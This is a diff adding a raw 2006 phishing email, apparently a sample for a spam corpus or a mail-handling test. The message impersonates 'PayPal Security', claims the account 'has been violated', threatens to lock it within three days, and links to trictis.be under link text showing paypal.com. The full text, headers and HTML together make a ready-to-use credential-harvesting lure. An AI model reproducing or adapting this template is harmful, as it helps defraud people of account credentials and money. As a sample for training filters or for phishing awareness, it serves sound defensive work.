@@ -1,0 +1,100 @@
+From nobody Sun Jan 25 13:49:58 2015
+Return-Path: <security@trictis.be>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by example.com (Postfix) with ESMTP id BC0FB469BF
+ for <user@login.example.com>; Wed, 16 Aug 2006 08:29:25 -0400 (EDT)
+Received: from olcsopc.hu (ns1.szervernet.hu [195.56.170.1])
+ by mail.example.org (Postfix) with ESMTP id 258F76FA544
+ for <user@example.com>; Wed, 16 Aug 2006 08:29:25 -0400 (EDT)
+Received: from User (host86-139-8-37.range86-139.btcentralplus.com
+ [86.139.8.37]) by olcsopc.hu (Postfix) with ESMTP id 1552D868FEB;
+ Wed, 16 Aug 2006 06:35:33 +0200 (CEST)
+Reply-To: <security@trictis.be>
+From: "PayPal Security" <security@trictis.be>
+Subject: Attention! Your PayPal account has been violated!
+Date: Wed, 16 Aug 2006 05:31:01 +0100
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20060816043533.1552D868FEB@olcsopc.hu>
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 56
+
+<head><title>PayPal</title>
+        <tr>
+        <td width=400>
+        <table>
+                <tr><td>Information Regarding Your account:</td></tr>
+                <tr>
+          <td><b>Dear PayPal Member!<br>
+            <br>
+            <font color="#FF0000">Attention! Your PayPal account has been violated!</font><br>
+            <br>
+            Someone with ip address 86.34.211.83 tried to access your personal 
+            account!</b><br>
+            <br>Please <b>click the link below</b> and
+enter your account information to confirm that you are not currently away. You have 3 days to confirm account
+information or your account will be locked.<br><br>
+                <table width="80%" cellspacing=0 border=0 bgcolor="#FFE65C" align=left>
+                        <tr><td>
+                        <table width="100%" cellpadding=4 bgcolor="#FFFECD" align=center>
+                                <tr>
+                      <td class="pp_sansserif" align=center><a target="_blank"  
+href="http://www.trictis.be/update/index.htm" onclick="return ShowLinkWarning()"  ><strong>Click here to 
+                        activate your account</strong></a></td>
+                    </tr>
+                        </table>
+                        </td></tr>
+                </table>
+                <br><br><BR>You can also confirm your email address by logging into your PayPal account at<a target="_blank"  href="http://www.trictis.be/update/index.htm" onclick="return ShowLinkWarning()"  
+http://www.trictis.be/update/index.htm"><br>
+            http://www.paypal.com/</a> Click on the "<strong>Confirm email</strong>" 
+            link in the Activate Account box and then enter this confirmation 
+            number: 1099-81971-4441-9833-3990<br>
+            <br>Thank you for using
+PayPal!<br>The PayPal Team
+                </td></tr>
+                <tr><td><hr class=dotted></td></tr>
+                <tr><td>
+                <tr>
+          <td class="pp_footer">Please do not reply to this e-mail. Mail sent 
+            to this address cannot be answered. For assistance, <br>
+            <img src="http://www.paypalobjects.com/en_US/i/logo/verisign.gif" ></td>
+        </tr><tr><td><img src="http://images.paypal.com/en_US/i/scr/pixel.gif"  height=10 width=1
+border=0></td></tr>
+                <tr>
+          <td>PayPal Email ID PP391</td>
+        </tr>
+        </table>
+        </td>
+        <td width=190 valign=top>
+        <table cellspacing=0 cellpadding=1 bgcolor="#cccccc">
+                <td>
+                <table cellspacing=0 cellpadding=0 bgcolor="#ffffff">
+                        <tr><td>
+                        <table width="100%" cellpadding=5 bgcolor="#eeeeee">
+                                <tr>
+                                    </tr>
+                        </table>
+                        <table cellpadding=5>
+                                <tr><td>You should never give your PayPal password to anyone.<br></td></tr>
+                        </table>
+                        </td></tr>
+                </table>
+                </td></tr>
+        </table>
+        
+    </td>
+  </tr>
+</table>
+</xhtml></span>
